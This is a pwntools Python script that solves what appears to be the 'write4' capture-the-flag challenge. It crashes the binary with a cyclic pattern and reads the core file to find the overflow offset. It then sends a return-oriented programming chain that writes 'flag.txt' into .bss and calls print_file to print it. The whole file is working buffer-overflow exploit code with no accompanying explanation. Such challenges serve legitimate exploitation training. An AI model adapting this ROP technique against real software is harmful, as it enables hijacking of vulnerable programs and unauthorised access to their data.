#!/usr/bin/python3

from pwn import *
import time

bin_file = "./write4"         # Binary for the challenge
core_file = "./core"          # Corefile
elf = ELF(bin_file)           # Grab that binary, bro
pattern = cyclic(1024)        # Go ahead and generate the DeBruin pattern

print_file_func = 0x400510
bss =             0x0000000000601038

pop_r12_r13_r14_r15 =     0x40068c
pop_r14_r15 =             0x400690
pop_rdi =                 0x400693
mov_to_r14 =              0x400628
mov_to_rsi =              0x400629

flag_txt = b'flag.txt'
nulls = 0x00000000

"""
Find the bug
"""
p = process(bin_file)
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
p.sendline(pattern)
print(p.readline())

time.sleep(2)

core = Corefile(core_file)
p.close()
fault_addr = int("0x" + hex(core.fault_addr)[10:], 16)
offset = cyclic_find(fault_addr)
print("Found offset")

payload = b"V"*offset # Add offset

payload += p64(pop_r12_r13_r14_r15)
payload += p64(nulls)
payload += p64(nulls)
payload += p64(bss)
payload += flag_txt
payload += p64(mov_to_r14)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(print_file_func)

with open('payload.txt', 'wb') as file:
  file.write(payload)

p = process(bin_file)
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
print(p.readline())
p.sendline(payload)
print(p.readline())
print(p.readline())
p.close()
